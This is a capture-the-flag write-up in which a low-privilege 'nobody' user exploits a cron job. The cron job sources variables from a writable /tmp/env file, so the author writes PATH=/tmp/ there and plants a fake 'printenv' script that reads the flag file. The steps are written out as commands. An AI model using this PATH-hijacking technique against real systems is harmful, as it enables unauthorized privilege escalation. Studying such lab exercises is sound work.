## CTF - Desafio 2

## Recon

In this challenge we are given a linux system.

```bash
nobody@330311abc802:/home/flag_reader$ uname -a
Linux 330311abc802 5.4.0-126-generic #142-Ubuntu SMP Fri Aug 26 12:12:57 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

If we use the command `whoami` and `groups` to check which user we are and what group permissions we have, we notice that we can't do much from the start:

```bash
nobody@330311abc802:/home/flag_reader$ whoami
nobody

nobody@330311abc802:/home/flag_reader$ groups
nogroup
```

In our `$HOME` we have 3 files:

#### main.c

```c
#include <stdio.h>
#include <unistd.h>

void my_big_congrats(){
    puts("TODO - Implement this in the near future!");
}

int main() {
    puts("I'm going to check if the flag exists!");

    if (access("/flags/flag.txt", F_OK) == 0) {
        puts("File exists!!");
        my_big_congrats();
    } else {
        puts("File doesn't exist!");
    }

    return 0;
}
```

#### my_script.sh

```bash
#!/bin/bash

if [ -f "/tmp/env" ]; then
    echo "Sourcing env"
    export $(/usr/bin/cat /tmp/env | /usr/bin/xargs)
    rm /tmp/env
fi

printenv
exec /home/flag_reader/reader
```

And a compiled version of the c script.

If we analyze the C script, we notice that essentially, all it does is checking if the file `/flags/flag.txt` exists and print a message according to it.

The bash script does the following:

 - If the file `/tmp/env` exists, it exports the contents of the file as environment variables using xargs.
 - It then removes the `/tmp/env` file.
 - It prints the environment variables using printenv.
 - It executes the `/home/flag_reader/reader` program.

The purpose of the script appears to be to set up the environment for the reader program by exporting variables from the `/tmp/env` file, and then running the reader program.

After analyzing the system we found that the only place we could write and create files was in fact in the directory `/tmp`.

If we run the `env` command we can see the current environment variables:

```
SHELL=/usr/sbin/nologin
HOSTNAME=330311abc802
SOCAT_PEERADDR=172.29.0.34
PWD=/home/flag_reader
LOGNAME=nobody
SOCAT_PEERPORT=53128
HOME=/nonexistent
USER=nobody
SHLVL=1
SOCAT_PPID=71
SOCAT_SOCKADDR=10.146.18.2
SOCAT_SOCKPORT=4006
SOCAT_PID=15215
S6_READ_ONLY_ROOT=1
PATH=/command:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SOCAT_VERSION=1.7.3.3
OLDPWD=/run/s6/legacy-services/socat
_=/usr/bin/env
```

If we check the cronjobs in `/etc/cron.d`, we will find the following cronjob:

```
nobody@330311abc802:/etc/cron.d$ cat /etc/cron.d/my_cron_script
PATH=/bin:/usr/bin:/usr/local/bin

* * * * * flag_reader /bin/bash -c "/home/flag_reader/my_script.sh > /tmp/last_log"
```

This cronjob runs the `/home/flag_reader/my_script.sh` script every minute, using bash as the interpreter. The output of the script is redirected to the `/tmp/last_log file`. The `PATH` variable is also set to include several directories that contain executables that may be used in the script.


## Exploitation

After some time exploring, we thought of changing the `PATH`. The `PATH` variable contains a list of directories that are searched by the system when a command is run. These directories typically contain executables and other programs that can be run from the command line. By changing the `PATH` variable, we can modify the location of executables that are run when a command is entered, which can change the side-effects of programs like `printenv` and others.

So, we can do the following:

```bash
echo "PATH=/tmp/" > /tmp/env
```

And then we can write a file `printenv` with a malicious payload to read the flag, like the following:

```bash
cat > /tmp/printenv << EOF
#!/usr/bin/bash
cat /flags/flag.txt
EOF
```

We then need to make the new "malicious printenv" executable like this:

```bash
chmod +x /tmp/printenv
```

This will print read the flag and, since the output of `my_script.sh` will be redirected to the file `/tmp/last_log`, we will get the flag in this file. It might now be instantaneous, since this runs once every minute, so you may need to be just a little patient.

